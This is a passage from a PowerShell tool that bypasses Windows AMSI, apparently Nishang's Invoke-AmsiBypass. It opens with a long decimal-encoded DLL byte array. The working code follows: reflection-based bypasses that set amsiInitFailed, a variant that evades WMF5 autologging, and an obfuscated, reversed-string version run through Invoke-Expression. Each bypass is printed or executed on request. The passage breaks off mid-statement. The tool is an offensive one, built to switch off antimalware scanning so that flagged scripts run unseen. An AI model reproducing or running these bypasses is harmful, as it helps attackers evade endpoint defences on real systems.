0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\u0026#34; if (([IntPtr]::Size) -eq 8) { Write-Verbose \u0026#34;64 bit process detected.\u0026#34; $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \u0026#34;32 bit process detected.\u0026#34; $DllBytes = $AmsiX86 } switch($method) { \u0026#34;unload\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output \u0026#39;[Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;).GetField(\u0026#39;\u0026#39;amsiInitFailed\u0026#39;\u0026#39;,\u0026#39;\u0026#39;NonPublic,Static\u0026#39;\u0026#39;).SetValue($null,$true)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiInitFailed\u0026#39;,\u0026#39;NonPublic,Static\u0026#39;).SetValue($null,$true) } } \u0026#34;unloadsilent\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method with WMF5 autologging bypass.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output \u0026#39;[Delegate]::CreateDelegate((\u0026#34;Func``3[String, $(([String].Assembly.GetType(\u0026#39;\u0026#39;System.Reflection.Bindin\u0026#39;\u0026#39;+\u0026#39;\u0026#39;gFlags\u0026#39;\u0026#39;)).FullName), System.Reflection.FieldInfo]\u0026#34; -as [String].Assembly.GetType(\u0026#39;\u0026#39;System.T\u0026#39;\u0026#39;+\u0026#39;\u0026#39;ype\u0026#39;\u0026#39;)), [Object]([Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;)),(\u0026#39;\u0026#39;GetFie\u0026#39;\u0026#39;+\u0026#39;\u0026#39;ld\u0026#39;\u0026#39;)).Invoke(\u0026#39;\u0026#39;amsiInitFailed\u0026#39;\u0026#39;,((\u0026#39;\u0026#39;Non\u0026#39;\u0026#39;+\u0026#39;\u0026#39;Public,Static\u0026#39;\u0026#39;) -as [String].Assembly.GetType(\u0026#39;\u0026#39;System.Reflection.Bindin\u0026#39;\u0026#39;+\u0026#39;\u0026#39;gFlags\u0026#39;\u0026#39;))).SetValue($null,$True)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Delegate]::CreateDelegate((\u0026#34;Func``3[String, $(([String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;)).FullName), System.Reflection.FieldInfo]\u0026#34; -as [String].Assembly.GetType(\u0026#39;System.T\u0026#39;+\u0026#39;ype\u0026#39;)), [Object]([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;)),(\u0026#39;GetFie\u0026#39;+\u0026#39;ld\u0026#39;)).Invoke(\u0026#39;amsiInitFailed\u0026#39;,((\u0026#39;Non\u0026#39;+\u0026#39;Public,Static\u0026#39;) -as [String].Assembly.GetType(\u0026#39;System.Reflection.Bindin\u0026#39;+\u0026#39;gFlags\u0026#39;))).SetValue($null,$True) } } \u0026#34;unloadobfuscated\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s Reflection method with obfuscation from Daneil Bohannon\u0026#39;s Invoke-Obfuscation - which bypasses WMF5 autologging.\u0026#34; if ($ShowOnly -eq $True) { $code = @\u0026#34; Sv (\u0026#39;R9\u0026#39;+\u0026#39;HYt\u0026#39;) ( \u0026#34; ) )93]rahC[]gnirtS[,\u0026#39;UCS\u0026#39;(ecalpeR.)63]rahC[]gnirtS[,\u0026#39;aEm\u0026#39;(ecalpeR.)\u0026#39;)eurt\u0026#39;+\u0026#39;aEm,llun\u0026#39;+\u0026#39;aEm(eulaVt\u0026#39;+\u0026#39;eS\u0026#39;+\u0026#39;.)UCScit\u0026#39;+\u0026#39;atS,ci\u0026#39;+\u0026#39;lbuPnoNUCS\u0026#39;+\u0026#39;,U\u0026#39;+\u0026#39;CSdeli\u0026#39;+\u0026#39;aFt\u0026#39;+\u0026#39;inI\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;maUCS(\u0026#39;+\u0026#39;dle\u0026#39;+\u0026#39;iF\u0026#39;+\u0026#39;teG\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;)\u0026#39;+\u0026#39;UCSslitU\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;mA.noitamotu\u0026#39;+\u0026#39;A.tn\u0026#39;+\u0026#39;em\u0026#39;+\u0026#39;eganaM.\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;sySUCS(epy\u0026#39;+\u0026#39;TteG.ylbmessA\u0026#39;+\u0026#39;.]\u0026#39;+\u0026#39;feR[\u0026#39;( (noisserpxE-ekovnI\u0026#34; ); Invoke-Expression( -Join ( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val )[ - 1..- (( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val ).Length)]) \u0026#34;@ Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output $code } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; Sv (\u0026#39;R9\u0026#39;+\u0026#39;HYt\u0026#39;) ( \u0026#34; ) )93]rahC[]gnirtS[,\u0026#39;UCS\u0026#39;(ecalpeR.)63]rahC[]gnirtS[,\u0026#39;aEm\u0026#39;(ecalpeR.)\u0026#39;)eurt\u0026#39;+\u0026#39;aEm,llun\u0026#39;+\u0026#39;aEm(eulaVt\u0026#39;+\u0026#39;eS\u0026#39;+\u0026#39;.)UCScit\u0026#39;+\u0026#39;atS,ci\u0026#39;+\u0026#39;lbuPnoNUCS\u0026#39;+\u0026#39;,U\u0026#39;+\u0026#39;CSdeli\u0026#39;+\u0026#39;aFt\u0026#39;+\u0026#39;inI\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;maUCS(\u0026#39;+\u0026#39;dle\u0026#39;+\u0026#39;iF\u0026#39;+\u0026#39;teG\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;)\u0026#39;+\u0026#39;UCSslitU\u0026#39;+\u0026#39;is\u0026#39;+\u0026#39;mA.noitamotu\u0026#39;+\u0026#39;A.tn\u0026#39;+\u0026#39;em\u0026#39;+\u0026#39;eganaM.\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;sySUCS(epy\u0026#39;+\u0026#39;TteG.ylbmessA\u0026#39;+\u0026#39;.]\u0026#39;+\u0026#39;feR[\u0026#39;( (noisserpxE-ekovnI\u0026#34; ); Invoke-Expression( -Join ( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val )[ - 1..- (( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val ).Length)]) } } \u0026#34;unload2\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s second Reflection method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output 